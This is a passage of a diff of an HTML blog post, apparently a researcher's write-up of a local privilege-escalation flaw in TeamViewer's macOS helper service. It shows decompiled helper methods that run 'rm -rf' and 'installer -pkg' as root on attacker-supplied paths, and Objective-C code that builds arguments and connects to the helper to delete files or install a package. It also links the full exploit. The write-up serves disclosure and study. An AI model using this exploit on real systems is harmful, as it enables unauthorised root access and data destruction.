+</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, r14] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [r14 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[rax remotePrintingPrinterIconPath] <span style="color:#069;font-weight:bold">retain</span>]] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[rax remotePrintingDatabasePath] <span style="color:#069;font-weight:bold">retain</span>]] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We find that it will run four system commands based on the argument we pass in, and it will delete four files or directories. The argument we pass should have a <code>stringArguments</code> property, which will also have a <code>remotePrintingPPDPath</code> property. Inspecting the class-dump, we can find the class with this property.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#66d9ef">@interface</span> <span style="color:#a6e22e">HelperArguments</span> : <span style="color:#a6e22e">NSObject</span> <span style="color:#f92672">&lt;</span>NSCopying, NSCoding<span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">HelperArguments</span> : <span style="color:#0a8;font-weight:bold">NSObject</span> <span style="color:#555">&lt;</span>NSCopying, NSCoding<span style="color:#555">&gt;</span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>(...)
-</span></span><span style="display:flex;"><span>    NSString <span style="color:#f92672">*</span>_bundlePath;
-</span></span><span style="display:flex;"><span>    NSString <span style="color:#f92672">*</span>_processLockName;
-</span></span><span style="display:flex;"><span>    HelperStringArguments <span style="color:#f92672">*</span>_stringArguments;
-</span></span><span style="display:flex;"><span>    TestMasterConfiguration <span style="color:#f92672">*</span>_testMasterConfig;
-</span></span><span style="display:flex;"><span>    NSString <span style="color:#f92672">*</span>_appPath;
+</span></span><span style="display:flex;"><span>    NSString <span style="color:#555">*</span>_bundlePath;
+</span></span><span style="display:flex;"><span>    NSString <span style="color:#555">*</span>_processLockName;
+</span></span><span style="display:flex;"><span>    HelperStringArguments <span style="color:#555">*</span>_stringArguments;
+</span></span><span style="display:flex;"><span>    TestMasterConfiguration <span style="color:#555">*</span>_testMasterConfig;
+</span></span><span style="display:flex;"><span>    NSString <span style="color:#555">*</span>_appPath;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Based on this we can conclude that the main object that is being sent via the connection is the <code>HelperArguments</code> which has a<code>stringArguments</code> property of the class type <code>HelperStringArguments</code>. We can find that class also in the class-dump.</p>
 <pre tabindex="0"><code>@interface HelperStringArguments : NSObject &lt;NSCopying, NSCoding&gt;
@@ -398,19 +398,19 @@ Ian Beer from Google Project zero also talked about these:
 }
 </code></pre><p>That class has a <code>remotePrintingPPDPath</code> property along with plenty of other NSString objects.</p>
 <p>To exploit this method we need to implement these classes, and create an object and setup their properties. This is shown below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>   <span style="color:#75715e">//setup parameters
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HelperStringArguments <span style="color:#f92672">*</span> hsa <span style="color:#f92672">=</span> [HelperStringArguments new];
-</span></span><span style="display:flex;"><span>     <span style="color:#75715e">//uninstallRemotePrinting will use these 4, any file specified here will be deleted
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    hsa.remotePrintingPPDPath <span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;/Library/a.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>    hsa.remotePrintingDatabasePath <span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;/Library/b.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>    hsa.remotePrintingPrinterIconPath<span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;/Library/c.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>    hsa.remotePrintingFilterPath <span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;/Library/d.txt&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>   <span style="color:#09f;font-style:italic">//setup parameters
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    HelperStringArguments <span style="color:#555">*</span> hsa <span style="color:#555">=</span> [HelperStringArguments new];
+</span></span><span style="display:flex;"><span>     <span style="color:#09f;font-style:italic">//uninstallRemotePrinting will use these 4, any file specified here will be deleted
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    hsa.remotePrintingPPDPath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/a.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>    hsa.remotePrintingDatabasePath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/b.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>    hsa.remotePrintingPrinterIconPath<span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/c.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>    hsa.remotePrintingFilterPath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/d.txt&#34;</span>;
 </span></span><span style="display:flex;"><span>     
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//we create our object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HelperArguments <span style="color:#f92672">*</span> helperargs <span style="color:#f92672">=</span> [[HelperArguments alloc] init];
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we create our object
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    HelperArguments <span style="color:#555">*</span> helperargs <span style="color:#555">=</span> [[HelperArguments alloc] init];
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//we need to embed HelperStringArguments
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    helperargs.stringArguments <span style="color:#f92672">=</span> hsa;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we need to embed HelperStringArguments
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    helperargs.stringArguments <span style="color:#555">=</span> hsa;
 </span></span></code></pre></div><p>To connect to the remote helper is fairly simple.</p>
 <pre tabindex="0"><code>    NSConnection *c = [NSConnection connectionWithRegisteredName:@&#34;com.teamviewer.Helper&#34; host:nil];
     BlessedHelperDistantObject *proxy = (BlessedHelperDistantObject *)[c rootProxy];
@@ -424,54 +424,54 @@ Ian Beer from Google Project zero also talked about these:
   </a>
 </h2>
 <p>The <code>installRemotePrinting:</code> method allows us to escalate our privileges to root. It&rsquo;s shown below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#75715e">/* @class BlessedHelperDistantObject */</span>
-</span></span><span style="display:flex;"><span>-(<span style="color:#66d9ef">char</span>)<span style="color:#a6e22e">installRemotePrinting:</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg2 {
-</span></span><span style="display:flex;"><span>    r15 <span style="color:#f92672">=</span> [arg2 <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    r13 <span style="color:#f92672">=</span> [[arg2 stringArguments] <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    rbx <span style="color:#f92672">=</span> [[arg2 bundlePath] <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    [r15 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    r15 <span style="color:#f92672">=</span> [[rbx stringByAppendingPathComponent:<span style="color:#e6db74">@&#34;Contents/Resources&#34;</span>] <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    [rbx <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    var_38 <span style="color:#f92672">=</span> r13;
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> [r13 remotePrintingInstallPkgName];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> [rax <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    var_30 <span style="color:#f92672">=</span> r15;
-</span></span><span style="display:flex;"><span>    r12 <span style="color:#f92672">=</span> [[r15 stringByAppendingPathComponent:rax] <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> [NSFileManager defaultManager];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> [rax <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    r13 <span style="color:#f92672">=</span> [rax fileExistsAtPath:r12];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (r13 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>            system([objc_retainAutorelease([[NSString stringWithFormat:<span style="color:#e6db74">@&#34;installer -pkg &#39;%@&#39; -target /&#34;</span>, r12] <span style="color:#66d9ef">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>            [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>            r14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class BlessedHelperDistantObject */</span>
+</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#c0f">installRemotePrinting:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> {
+</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> [[arg2 stringArguments] <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> [[arg2 bundlePath] <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    [r15 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [[rbx <span style="color:#99f">stringByAppendingPathComponent</span>:<span style="color:#c30">@&#34;Contents/Resources&#34;</span>] <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    [rbx <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    var_38 <span style="color:#555">=</span> r13;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [r13 remotePrintingInstallPkgName];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    var_30 <span style="color:#555">=</span> r15;
+</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> [[r15 <span style="color:#99f">stringByAppendingPathComponent</span>:rax] <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> [rax <span style="color:#99f">fileExistsAtPath</span>:r12];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (r13 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>            system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;installer -pkg &#39;%@&#39; -target /&#34;</span>, r12] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
+</span></span><span style="display:flex;"><span>            [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>            r14 <span style="color:#555">=</span> <span style="color:#f60">0x1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            r14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            r14 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    [r12 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [var_30 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [var_38 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> r14 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rax;
+</span></span><span style="display:flex;"><span>    [r12 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [var_30 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [var_38 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> r14 <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> rax;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>This function is slightly more complicated. It again expects a <code>HelperArguments</code> object. It will take its <code>stringArguments</code>  as well as the  <code>bundlePath</code> property. It will append <code>Contents/Resources</code> to the path found in <code>bundlePath</code> and append to that the <code>remotePrintingInstallPkgName</code> taken from the <code>stringArguments</code>. Once it has the full path it will install it via the <code>installer</code> command line.</p>
 <p>In this case we need to setup our objects as follows.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>   <span style="color:#75715e">//setup parameters
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HelperStringArguments <span style="color:#f92672">*</span> hsa <span style="color:#f92672">=</span> [HelperStringArguments new];
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>   <span style="color:#09f;font-style:italic">//setup parameters
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    HelperStringArguments <span style="color:#555">*</span> hsa <span style="color:#555">=</span> [HelperStringArguments new];
 </span></span><span style="display:flex;"><span>     
-</span></span><span style="display:flex;"><span>     <span style="color:#75715e">//this is the name of the package that will be installed by installRemotePrinting
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    hsa.remotePrintingInstallPkgName <span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;my_package.pkg&#34;</span>;
+</span></span><span style="display:flex;"><span>     <span style="color:#09f;font-style:italic">//this is the name of the package that will be installed by installRemotePrinting
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    hsa.remotePrintingInstallPkgName <span style="color:#555">=</span> <span style="color:#c30">@&#34;my_package.pkg&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//we create our object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HelperArguments <span style="color:#f92672">*</span> helperargs <span style="color:#f92672">=</span> [[HelperArguments alloc] init];
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we create our object
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    HelperArguments <span style="color:#555">*</span> helperargs <span style="color:#555">=</span> [[HelperArguments alloc] init];
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//installRemotePrinting will use this path to locate the package named above
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//package will need to be inside /Contents/Resources/
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    helperargs.bundlePath <span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;/tmp/pkg.app&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//we need to embed HelperStringArguments
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    helperargs.stringArguments <span style="color:#f92672">=</span> hsa;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//installRemotePrinting will use this path to locate the package named above
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">//package will need to be inside /Contents/Resources/
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    helperargs.bundlePath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/tmp/pkg.app&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we need to embed HelperStringArguments
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    helperargs.stringArguments <span style="color:#555">=</span> hsa;
 </span></span></code></pre></div><p>And we will need to place a package file in <code>/tmp/pkg.app/Contents/Resources/my_package.pkg</code>.</p>
 <p>Full exploit code is available here:
 <a href="https://gist.github.com/theevilbit/6e49b2e1d1ca1189f4c936cbf170a101"  class="external-link" target="_blank" rel="noopener">TeamViewer LPE exploit · GitHub</a></p>
